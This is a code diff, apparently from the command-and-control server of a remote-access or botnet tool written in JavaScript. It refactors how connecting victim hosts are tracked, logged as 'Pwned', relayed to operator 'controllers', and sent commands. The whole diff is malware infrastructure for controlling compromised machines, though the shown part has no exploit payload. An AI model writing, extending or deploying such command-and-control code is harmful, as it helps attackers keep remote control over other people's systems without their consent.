@@ -13,26 +13,37 @@ class Host {
      */
     constructor(socket) {
         this.connection = new PacketConnection(socket);
-        this.connection.on('packet', this.handleResponse);
+        this.connection.on('packet', (data) => {
+            let packet = parsePacket('host', 'response', data);
+            this.handleResponse(packet);
+        });
     }
 
+    /**
+     * Handle response from this host
+     * ! Not meant to be called outside of this class !
+     * @param {*} packet 
+     */
     handleResponse(packet) {
-        let type = null;
-        for (let pkt of packet_types.control.response.values()) {
-            if (pkt.name == 'hostresponse') {
-                type = pkt;
-                break;
-            }
-        }
         let wrappedPkt = {
-            _ptype: type,
+            _ptype: packet_types.control.response.get('hostresponse'),
             data: packet,
         };
-        controllers[0].sendResponse(wrappedPkt);
+        //TODO: broadcast to any clients
+        try {
+            controllers[0].send(wrappedPkt);
+        } catch (err) {
+            //TODO
+            console.error(err);
+        }
     }
 
-    sendCommand(command) {
-        this.connection.write(command);
+    /**
+     * Send packet to this host
+     * @param {*} packet 
+     */
+    sendCommand(packet) {
+        this.connection.write(serializePacket(packet));
     }
 }
 
@@ -41,15 +52,16 @@ class Host {
  */
 function handleIncomingHost(socket) {
     let host = new Host(socket);
-    let index = hosts.push(host) - 1;
+    hosts.push(host);
+    console.log(`[+] Pwned ${socket.remoteAddress} ;)`);
     socket.on('close', () => {
-        console.log(`- Host ${index} disconnected`);
-        hosts.splice(index, 1);
+        console.log(`[-] Host ${socket.remoteAddress} disconnected`);
+        hosts.splice(hosts.findIndex(i => i == host), 1);
     });
     socket.on('error', () => {
-        console.log(`! Host ${index} forcibly exited`);
+        console.log(`[!] Host ${socket.remoteAddress} forcibly exited`);
+        hosts.splice(hosts.findIndex(i => i == host), 1);
     });
-    console.log(`+ Pwned ${socket.remoteAddress} ;)`);
     let packet = createPacket('control', 'response', 'newpwn');
     packet.ip = socket.remoteAddress;
     for (let c of controllers) {
